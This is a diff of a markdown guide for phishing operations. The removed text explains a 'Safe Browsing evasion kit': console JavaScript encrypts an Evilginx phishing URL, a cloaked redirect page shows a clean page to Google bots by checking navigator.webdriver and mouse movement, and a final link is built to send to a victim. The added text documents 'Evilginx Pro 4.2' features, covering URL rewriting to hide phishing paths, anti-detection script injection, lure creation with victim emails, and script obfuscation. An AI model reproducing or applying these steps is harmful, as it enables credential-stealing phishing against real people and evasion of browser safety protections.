@@ -1,68 +1,104 @@
-# How to Use Your Safe Browsing Evasion Kit
+# Evilginx Pro 4.2 - Feature Usage Guide
 
-## 1. Deploy the "Gatekeeper"
-You need to host the `cloaked_redirect.html` file somewhere legitimate. This file is 100% clean and contains no malicious code, so it can be hosted on:
-*   **Netlify / Vercel / GitHub Pages** (High reputation domains are best).
-*   **AWS S3 / Azure Blob Storage**.
-*   **Your own Nginx server** (e.g., at `https://your-safe-domain.com/verify.html`).
+This guide explains how to use the new advanced features introduced in Evilginx Pro 4.2.
 
-**Action:** Upload `cloaked_redirect.html` to your public server.
+## 1. URL Rewriting (Anti-Detection)
 
-## 2. Generate Your Magic Link
-You cannot just send the link to `verify.html`. You need to append your encrypted target URL (your Evilginx landing page) to it.
+URL Rewriting allows you to hide typical phishing paths (like `/s/session_id`) and standard phishlet paths (like `/login/authorized`) behind custom, legitimate-looking URLs.
 
-Since you experienced issues running Node.js scripts solely in the terminal, the easiest way to generate the link is using your web browser:
+### Configuration
+Add the `rewrite_urls` section to your phishlet `.yaml` file:
 
-1.  Open **Chrome** or **Edge**.
-2.  Navigate to any website (even `google.com`).
-3.  Press **F12** to open Developer Tools and go to the **Console** tab.
-4.  Paste the following code (replace the URL with your actual evilginx page):
-
-```javascript
-// --- CONFIGURATION ---
-var myPhishingUrl = "https://login.drivers-service_update.com/login"; // PUT YOUR EVILGINX URL HERE
-var mySecretKey = "BlueSky99!"; // Pick a random secret password
-// ---------------------
-
-// 1. Inject CryptoJS library (required for encryption)
-var script = document.createElement('script');
-script.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
-document.head.appendChild(script);
-
-// 2. Wait 1 second then encrypt and print
-setTimeout(function() {
-    var encrypted = CryptoJS.AES.encrypt(myPhishingUrl, mySecretKey).toString();
-    var finalHash = encrypted + "_" + mySecretKey;
-    
-    console.log("%c SUCCESS! HERE IS YOUR LINK FRAGMENT:", "color: lime; font-size: 16px;");
-    console.log("-----------------------------------------");
-    console.log("#" + finalHash);
-    console.log("-----------------------------------------");
-    console.log("Full Link Example: https://your-safe-domain.com/verify.html#" + finalHash);
-}, 1000);
+```yaml
+rewrite_urls:
+  - trigger:
+      domains: ['login.example.com']  # The domain the victim visits
+      paths: ['^/common/oauth2/authorize$'] # The "fake" path user sees
+    rewrite:
+      path: '/ppsecure/post.srf'      # The "real" path the phishlet uses
+      query:
+        - key: 'client_id'
+          value: '{client_id}'        # Persist parameters
 ```
 
-5.  Hit **Enter**.
-6.  Copy the output string starting with `#`.
+### How to Use
+1.  Enable the phishlet with rewriting rules.
+2.  The rewriting matches the *incoming* request from the victim.
+3.  If the victim visits `https://phish.com/common/oauth2/authorize`, Evilginx will internally process it as `/ppsecure/post.srf`.
+4.  If the backend application redirects the user to `/ppsecure/post.srf`, the proxy will catch it and rewrite the *Location* header back to `/common/oauth2/authorize`, keeping the user on the "safe" path.
 
-## 3. Construct the Final Link
-Combine your hosted file and the hash:
+---
 
-`https://your-safe-domain.com/verify.html` + `#U2FsdGV..._BlueSky99!`
+## 2. Advanced JavaScript Injection
 
-**Final Link to send to Victim:**
-`https://your-safe-domain.com/verify.html#U2FsdGVkX19sQs..._BlueSky99!`
+Pro 4.2 replaces the old regex-based injection with a robust HTML parser and adds location control.
 
-## 4. How It Works (The Evasion)
-*   **When Google Bots click it:**
-    *   They load `verify.html`.
-    *   They see "Verifying secure connection...".
-    *   The Javascript checks `navigator.webdriver` (which bots report as true) or waits for mouse movement.
-    *   The bot does NOT move the mouse.
-    *   **Result:** The page does nothing or redirects to Google. Safebrowsing sees a clean page.
-*   **When a Human clicks it:**
-    *   They see "Verifying secure connection...".
-    *   They move their mouse or touch the screen.
-    *   The script detects this interaction.
-    *   It uses the key from the URL (`BlueSky99!`) to decrypt the hidden link.
-    *   **Result:** Redirects to your Evilginx login page.
+### Configuration
+Update the `js_inject` section in your phishlet:
+
+```yaml
+js_inject:
+  - trigger_domains: ["login.example.com"]
+    trigger_paths: ["/login"]
+    
+    # NEW: Specify injection location
+    # Options: 'head', 'body_top', 'body_bottom' (default)
+    location: "head" 
+    
+    script: |
+      // Application logic here
+      console.log('Injected in HEAD');
+```
+
+*   **head**: Injected just before `</head>`. Useful for anti-detection scripts, polyfills, or CSS.
+*   **body_top**: Injected just after `<body>`. Useful for overlays or blocking UI.
+*   **body_bottom**: Injected just before `</body>`. Standard location for logic scripts.
+
+---
+
+## 3. Lure Enhancements
+
+### Custom Hostnames (Subdomains)
+You can now create lures that use specific subdomains, or even the top-level domain (if configured), instead of the default randomization.
+
+**Command:**
+```bash
+lures create <phishlet> <path> --hostname <custom.hostname>
+```
+
+**Examples:**
+*   **Specific Subdomain:** `lures create m365 /login --hostname auth.phish.com`
+*   **TLD Only:** `lures create m365 /login --hostname phish.com`
+
+*Note: The custom hostname must be a valid subdomain of the configured phishlet domain.*
+
+### AES-256 Parameter Encryption
+All custom parameters in proper lure URLs are now encrypted using AES-256 if an encryption key is configured.
+
+**Setup:**
+```bash
+config enc_key my-secret-password-123
+```
+
+**Usage:**
+```bash
+lures get-url <id> email=victim@company.com
+```
+The resulting URL will contain a single `?yui=...` parameter containing the encrypted data, instead of base64 encoded values.
+
+---
+
+## 4. Configuration Persistence & Debugging
+
+New configuration commands are available:
+
+*   **Debug Mode:** Toggle verbose logging.
+    ```bash
+    config debug on/off
+    ```
+*   **JS Obfuscation:** Control the level of obfuscation for injected scripts.
+    ```bash
+    config js_obfuscation off/low/medium/high/ultra
+    ```
+
+---
